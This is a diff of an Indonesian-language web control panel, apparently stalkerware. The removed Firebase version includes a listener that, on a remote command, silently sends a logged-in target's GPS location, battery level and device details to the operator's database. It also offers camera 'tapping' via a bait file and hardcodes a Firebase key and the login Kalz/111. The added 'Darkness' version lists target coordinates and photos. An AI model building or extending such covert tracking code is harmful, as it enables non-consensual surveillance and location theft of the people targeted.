@@ -2,219 +2,273 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VORTEX LIGHT | REMOTE v6.0</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Darkness | Ultra Full</title>
     <style>
-        :root { --blue: #00d2ff; --bg: #020b16; --card: #05162a; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
-        header { background: #000; padding: 15px; border-bottom: 2px solid var(--blue); text-align: center; }
-        .bolt-logo { font-size: 30px; color: var(--blue); text-shadow: 0 0 10px var(--blue); }
-        .top-nav { display: flex; justify-content: space-around; background: #05162a; padding: 12px 0; border-bottom: 1px solid #103a63; }
-        .nav-opt { font-size: 10px; color: #444; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        .nav-opt.active { color: var(--blue); }
-        .container { padding: 15px; height: 75vh; overflow-y: auto; }
-        .panel { display: none; } .panel.active { display: block; }
-        .card { background: var(--card); border: 1px solid #103a63; padding: 15px; border-radius: 10px; margin-bottom: 15px; }
-        table { width: 100%; font-size: 11px; text-align: left; }
-        td { padding: 8px; border-bottom: 1px solid #081d35; }
-        .btn-exe { background: var(--blue); color: #000; border: none; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 9px; width: 100%; margin-top: 5px; }
-        .btn-kill { border: 1px solid #ff4d4d; color: #ff4d4d; background: transparent; padding: 3px 6px; border-radius: 3px; cursor: pointer; }
-        input, select { background: #000; border: 1px solid #103a63; color: #fff; padding: 10px; border-radius: 5px; width: 100%; margin-bottom: 10px; }
+        :root { --red: #ff0000; --bg: #000; --card: #080808; --gray: #555; }
+        
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body { 
+            background: var(--bg); 
+            color: #fff; 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            height: 100vh; 
+            width: 100vw;
+            display: flex; 
+            flex-direction: column; 
+            overflow: hidden; 
+        }
+
+        /* BANNER DEVELOPER (FULL WIDTH) */
+        .dev-banner { 
+            background: var(--red); 
+            color: #fff; 
+            font-size: 11px; 
+            font-weight: 900; 
+            text-align: center; 
+            padding: 12px; 
+            letter-spacing: 3px; 
+            text-transform: uppercase; 
+            box-shadow: 0 4px 15px rgba(255,0,0,0.3);
+            z-index: 10;
+        }
+
+        /* HEADER */
+        .header { padding: 25px 20px 10px; text-align: center; }
+        .header h1 { 
+            color: var(--red); 
+            margin: 0; 
+            font-size: 28px; 
+            letter-spacing: 8px; 
+            font-weight: 900;
+            text-shadow: 0 0 20px rgba(255,0,0,0.5);
+        }
+        #uInf { font-size: 10px; color: var(--gray); margin-top: 8px; letter-spacing: 1px; }
+
+        /* CONTENT AREA (FULL SCROLL) */
+        .content-container { 
+            flex: 1; 
+            padding: 20px; 
+            overflow-y: auto; 
+            position: relative;
+        }
+        .section { display: none; width: 100%; }
+        .section.active { display: block; animation: slideUp 0.3s ease-out; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* TABS NAVIGATION (BOTTOM FIXED) */
+        .bottom-nav { 
+            background: #000; 
+            height: 75px; 
+            display: flex; 
+            justify-content: space-around; 
+            align-items: center;
+            padding-bottom: env(safe-area-inset-bottom);
+        }
+        .nav-btn { 
+            background: none; 
+            border: none; 
+            color: var(--gray); 
+            font-size: 10px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            flex: 1;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: 0.3s;
+        }
+        .nav-btn.active { color: #fff; position: relative; }
+        .nav-btn.active::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            width: 30%;
+            height: 3px;
+            background: var(--red);
+            border-radius: 0 0 5px 5px;
+            box-shadow: 0 0 10px var(--red);
+        }
+        .nav-btn span { font-size: 20px; margin-bottom: 5px; }
+
+        /* TABLES & LISTS (CLEAN DESIGN) */
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th { text-align: left; color: var(--red); font-size: 11px; padding: 12px 5px; text-transform: uppercase; }
+        td { padding: 15px 5px; border-bottom: 1px solid #111; font-size: 13px; color: #ccc; }
+        
+        .btn-action { 
+            background: none; 
+            border: 1px solid var(--red); 
+            color: var(--red); 
+            padding: 5px 10px; 
+            font-size: 10px; 
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* FORMS */
+        .form-box { background: var(--card); padding: 20px; border-radius: 5px; margin-bottom: 30px; }
+        input, select { 
+            width: 100%; 
+            padding: 15px; 
+            margin: 8px 0; 
+            background: #111; 
+            border: 1px solid #222; 
+            color: #fff; 
+            font-weight: bold;
+        }
+        .btn-submit { background: var(--red); color: #fff; border: none; padding: 15px; width: 100%; font-weight: 900; letter-spacing: 2px; cursor: pointer; }
+
+        /* LOGIN OVERLAY (FULL) */
+        #login-screen { 
+            position: fixed; 
+            inset: 0; 
+            background: #000; 
+            z-index: 100; 
+            display: flex; 
+            flex-direction: column;
+            align-items: center; 
+            justify-content: center; 
+            padding: 40px;
+        }
     </style>
 </head>
 <body>
 
-    <div id="login-overlay" style="position:fixed; inset:0; background:#000; z-index:1000; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px;">
-        <div class="bolt-logo">⚡</div>
-        <input type="text" id="user" placeholder="IDENTITY" style="max-width:300px; text-align:center;">
-        <input type="password" id="pass" placeholder="ACCESS KEY" style="max-width:300px; text-align:center;">
-        <button class="btn-exe" style="max-width:300px; height:45px;" onclick="login()">AUTHORIZE</button>
+    <div id="login-screen">
+        <h1 style="color:var(--red); letter-spacing:10px; margin-bottom:30px;">DARKNESS</h1>
+        <div style="width: 100%; max-width: 300px;">
+            <input type="text" id="uIn" placeholder="USERNAME">
+            <input type="password" id="pIn" placeholder="PASSWORD">
+            <button class="btn-submit" onclick="login()">AUTHORIZE</button>
+        </div>
     </div>
 
-    <header><div class="bolt-logo">⚡ VORTEX REMOTE</div></header>
+    <div class="dev-banner">DEVELOPER KALZ | RMT SYSTEM SUPREME</div>
 
-    <div class="top-nav">
-        <div class="nav-opt active" onclick="nav('target', this)">Target</div>
-        <div id="nav-lacak" class="nav-opt" onclick="nav('lacak', this)">Lacak</div>
-        <div class="nav-opt" onclick="nav('chat', this)">Chat</div>
-        <div id="nav-sell" class="nav-opt" style="display:none;" onclick="nav('sell', this)">Sell</div>
+    <div class="header">
+        <h1>DARKNESS</h1>
+        <div id="uInf">AUTHENTICATING...</div>
     </div>
 
-    <div class="container">
-        <div id="target" class="panel active">
-            <div id="dev-radar" style="display:none;">
-                <div class="card">
-                    <div style="font-size:10px; color:var(--blue); margin-bottom:10px;">📡 ACTIVE SATELLITE SIGNALS</div>
-                    <table id="target-table">
-                        <thead><tr style="color:#555"><th>USER</th><th>DEVICE info</th><th>SNAP</th><th>ACT</th></tr></thead>
-                        <tbody id="target-list"></tbody>
-                    </table>
-                </div>
-            </div>
-            <div id="no-access-target" style="text-align:center; padding:50px; color:#333;">RADAR ENCRYPTED</div>
+    <div class="content-container">
+        
+        <div id="t-track" class="section active">
+            <h3 style="margin: 0 0 15px 0; font-size: 14px;">TARGET COMMAND LOGS</h3>
+            <table>
+                <thead><tr><th>TIME</th><th>COORDS</th><th>PHOTO</th><th>ACT</th></tr></thead>
+                <tbody id="l-track"></tbody>
+            </table>
         </div>
 
-        <div id="lacak" class="panel">
-            <div class="card">
-                <div style="font-size:11px; color:var(--blue); margin-bottom:15px;">🛰️ MANUAL INTERCEPTOR</div>
-                <button class="btn-exe" style="background:#0055ff; color:#fff;" onclick="manualLoc()">📍 AMBIL ALAMAT (GPS)</button>
-                <button class="btn-exe" style="margin-top:15px;" onclick="manualSnap()">📸 SADAP FOTO (CAMERA)</button>
-                <p style="font-size:9px; color:#444; margin-top:10px; text-align:center;">Izin browser diperlukan untuk eksekusi manual.</p>
-            </div>
-        </div>
-
-        <div id="chat" class="panel">
-            <div class="card">
-                <div id="chat-display" style="height:250px; overflow-y:auto; font-size:12px; margin-bottom:10px; background:#000; padding:10px;"></div>
-                <div style="display:flex; gap:5px;">
-                    <input type="text" id="chat-input" placeholder="Type..." style="margin:0;">
-                    <button class="btn-exe" style="width:50px; margin:0;" onclick="sendChat()">➤</button>
-                </div>
-            </div>
-        </div>
-
-        <div id="sell" class="panel">
-            <div class="card">
-                <div style="font-size:11px; color:var(--blue); margin-bottom:10px;">CREATE NEW ENTITY</div>
-                <input type="text" id="new-name" placeholder="Username">
-                <input type="text" id="new-pass" placeholder="Password">
-                <select id="new-role">
+        <div id="t-acc" class="section">
+            <div class="form-box">
+                <h3 style="margin: 0 0 15px 0; font-size: 14px; color: var(--red);">NEW ACCOUNT</h3>
+                <input type="text" id="nu" placeholder="USER ID">
+                <input type="password" id="np" placeholder="PASS KEY">
+                <select id="nr">
                     <option value="member">MEMBER</option>
                     <option value="admin">ADMIN</option>
                     <option value="owner">OWNER</option>
                 </select>
-                <button class="btn-exe" onclick="deploy()">GENERATE AKUN</button>
+                <button class="btn-submit" onclick="createAcc()">EXECUTE REGISTRY</button>
             </div>
+            <h3 style="margin: 20px 0 10px 0; font-size: 14px;">ACTIVE OPERATIVES</h3>
+            <table>
+                <thead><tr><th>OPERATIVE</th><th>ROLE</th><th>ACT</th></tr></thead>
+                <tbody id="l-user"></tbody>
+            </table>
         </div>
+
+        <div id="t-supp" class="section">
+            <div style="border-left: 4px solid var(--red); padding: 20px; background: var(--card);">
+                <h2 style="margin: 0;">PROJECT LEAD: KALZ</h2>
+                <p style="color:var(--gray)">Partner & Designer: Gemini-AI</p>
+                <hr style="border: 0; border-top: 1px solid #222; margin: 15px 0;">
+                <p style="font-size: 12px;">Memory Offline: <span style="color:var(--red)">ENABLED</span></p>
+                <p style="font-size: 12px;">Security Protocol: <span style="color:var(--red)">ACTIVE</span></p>
+            </div>
+            <button class="btn-submit" style="margin-top: 30px; background: #222;" onclick="location.reload()">TERMINATE SESSION</button>
+        </div>
+
+    </div>
+
+    <div class="bottom-nav">
+        <button class="nav-btn active" onclick="tab('t-track', this)">
+            <span>🛰️</span>TRACK
+        </button>
+        <button id="n-acc" class="nav-btn" onclick="tab('t-acc', this)">
+            <span>👥</span>ACCOUNTS
+        </button>
+        <button class="nav-btn" onclick="tab('t-supp', this)">
+            <span>🛠️</span>SUPPORT
+        </button>
     </div>
 
 <script>
-    const config = { 
-        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
-        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
-    };
-    firebase.initializeApp(config);
-    const db = firebase.database();
+    let users = JSON.parse(localStorage.getItem('darkness_users')) || [{u:"Kalz", p:"111", r:"developer"}];
+    let ses = null;
 
-    let myName = ""; let myRole = "";
-
+    // LOGIN LOGIC
     function login() {
-        const u = document.getElementById('user').value.trim();
-        const p = document.getElementById('pass').value.trim();
-        if (u === "Kalz" && p === "111") {
-            myName = "Kalz"; myRole = "developer"; setupUI(); return;
-        }
-        db.ref('users/' + u).once('value', (s) => {
-            if (s.exists() && s.val().password === p) {
-                myName = u; myRole = s.val().role; setupUI();
-                listenForRemote(u); // Target dengerin perintah remot dari Kalz
-            } else { alert("WRONG KEY"); }
+        const u = document.getElementById('uIn').value, p = document.getElementById('pIn').value;
+        const f = users.find(x => x.u === u && x.p === p);
+        if(f) {
+            ses = f; 
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('uInf').innerText = `ACCESS GRANTED: ${u.toUpperCase()} | ROLE: ${f.r.toUpperCase()}`;
+            if(f.r !== 'developer') document.getElementById('n-acc').style.display = 'none';
+            loadT(); loadU(); setInterval(checkStatus, 3000);
+        } else alert("ACCESS DENIED: WRONG CREDENTIALS");
+    }
+
+    // FORCE LOGOUT IF DELETED
+    function checkStatus() { if(!users.find(x => x.u === ses.u)) { alert("ACCOUNT REVOKED"); location.reload(); } }
+
+    // TAB SWITCHER (FIXED)
+    function tab(id, b) {
+        document.querySelectorAll('.section').forEach(c => c.classList.remove('active'));
+        document.querySelectorAll('.nav-btn').forEach(n => n.classList.remove('active'));
+        document.getElementById(id).classList.add('active'); 
+        b.classList.add('active');
+    }
+
+    // ACCOUNT MANAGEMENT
+    function createAcc() {
+        const u = document.getElementById('nu').value, p = document.getElementById('np').value, r = document.getElementById('nr').value;
+        if(u && p) { users.push({u, p, r}); save(); loadU(); alert("Operative Registered."); }
+    }
+    function loadU() {
+        const b = document.getElementById('l-user'); b.innerHTML = '';
+        users.forEach((x, i) => { 
+            if(x.r==='developer') return; 
+            b.innerHTML += `<tr><td>${x.u}</td><td><span style="color:var(--gray)">${x.r}</span></td>
+            <td><button class="btn-action" onclick="delU(${i})">REMOVE</button></td></tr>`; 
         });
     }
+    function delU(i) { if(confirm("Terminate this account?")) { users.splice(i, 1); save(); loadU(); } }
 
-    function setupUI() {
-        document.getElementById('login-overlay').style.display = 'none';
-        if (myRole === "developer") {
-            document.getElementById('dev-radar').style.display = 'block';
-            document.getElementById('no-access-target').style.display = 'none';
-            document.getElementById('nav-sell').style.display = 'block';
-            loadTargets();
-        }
-        loadChat();
-    }
-
-    function nav(id, el) {
-        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-        document.querySelectorAll('.nav-opt').forEach(o => o.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-        el.classList.add('active');
-    }
-
-    // --- DEVELOPER REMOTE LOGIC ---
-    function loadTargets() {
-        db.ref('users').on('value', (snap) => {
-            const list = document.getElementById('target-list');
-            list.innerHTML = "";
-            snap.forEach((child) => {
-                const d = child.val();
-                list.innerHTML += `
-                <tr>
-                    <td><b>${child.key}</b><br><span style="color:var(--blue)">${d.role}</span></td>
-                    <td style="font-size:9px; color:#888;">📱 ${d.brand || '?'}<br>🔋 ${d.battery || '?'}%</td>
-                    <td>${d.snap ? `<img src="${d.snap}" style="width:35px;" onclick="window.open('${d.snap}')">` : 'N/A'}</td>
-                    <td>
-                        <button class="btn-exe" onclick="remoteRequest('${child.key}')">REMOT</button>
-                        <button class="btn-kill" onclick="kill('${child.key}')">X</button>
-                    </td>
-                </tr>`;
-            });
+    // TARGET MANAGEMENT
+    function loadT() {
+        const t = JSON.parse(localStorage.getItem('darkness_targets') || '[]');
+        const b = document.getElementById('l-track'); b.innerHTML = '';
+        t.forEach((x, i) => { 
+            b.innerHTML += `<tr><td>${x.time}</td><td>${x.lat.toFixed(2)}, ${x.lon.toFixed(2)}</td>
+            <td><button class="btn-action" onclick="window.open('${x.img}')">VIEW</button></td>
+            <td><button class="btn-action" onclick="delT(${i})">X</button></td></tr>`; 
         });
     }
-
-    function remoteRequest(tid) {
-        // Kirim sinyal ke target buat Moto & Kirim Alamat Otomatis
-        db.ref('remot/' + tid).set({ cmd: 'capture', time: Date.now() });
-        alert("REMOTE SIGNAL SENT TO " + tid);
+    function delT(i) {
+        let t = JSON.parse(localStorage.getItem('darkness_targets') || '[]'); t.splice(i, 1);
+        localStorage.setItem('darkness_targets', JSON.stringify(t)); loadT();
     }
-
-    // --- TARGET LISTENER (Remot Jarak Jauh) ---
-    function listenForRemote(un) {
-        db.ref('remot/' + un).on('value', async (snap) => {
-            if (snap.exists()) {
-                // Eksekusi Ambil Spek, Foto, Lokasi
-                const battery = await navigator.getBattery().then(b => Math.floor(b.level * 100));
-                const brand = navigator.userAgent.split(')')[0].split('(')[1];
-                
-                // Ambil Lokasi & Kirim ke DB
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    db.ref('users/' + un).update({
-                        battery: battery,
-                        brand: brand,
-                        location: pos.coords.latitude + "," + pos.coords.longitude
-                    });
-                });
-                // Hapus perintah remot setelah dieksekusi
-                db.ref('remot/' + un).remove();
-            }
-        });
-    }
-
-    // --- MANUAL LACAK (Member/Admin/Owner) ---
-    function manualLoc() {
-        navigator.geolocation.getCurrentPosition((p) => {
-            alert("ALAMAT ANDA: " + p.coords.latitude + ", " + p.coords.longitude);
-        });
-    }
-
-    function manualSnap() { alert("Izin Kamera Diperlukan. (Gunakan File Umpan untuk Sadap Otomatis)"); }
-
-    // --- GLOBAL CHAT & SELL ---
-    function loadChat() {
-        db.ref('vortex_chat').on('value', (s) => {
-            const d = document.getElementById('chat-display'); d.innerHTML = "";
-            s.forEach((c) => {
-                const v = c.val();
-                d.innerHTML += `<div><b style="color:${v.role=='developer'?'#00d2ff':'#888'}">[${v.user}]</b>: ${v.text}</div>`;
-            });
-            d.scrollTop = d.scrollHeight;
-        });
-    }
-
-    function sendChat() {
-        const i = document.getElementById('chat-input');
-        if(i.value) { db.ref('vortex_chat').push({ user: myName, role: myRole, text: i.value }); i.value = ""; }
-    }
-
-    function deploy() {
-        const n = document.getElementById('new-name').value;
-        const p = document.getElementById('new-pass').value;
-        const r = document.getElementById('new-role').value;
-        if(n && p) { db.ref('users/' + n).set({ password: p, role: r }); alert("Created!"); }
-    }
-
-    function kill(t) { if(confirm("Hapus?")) db.ref('users/' + t).remove(); }
+    
+    function save() { localStorage.setItem('darkness_users', JSON.stringify(users)); }
 </script>
 </body>
 </html>
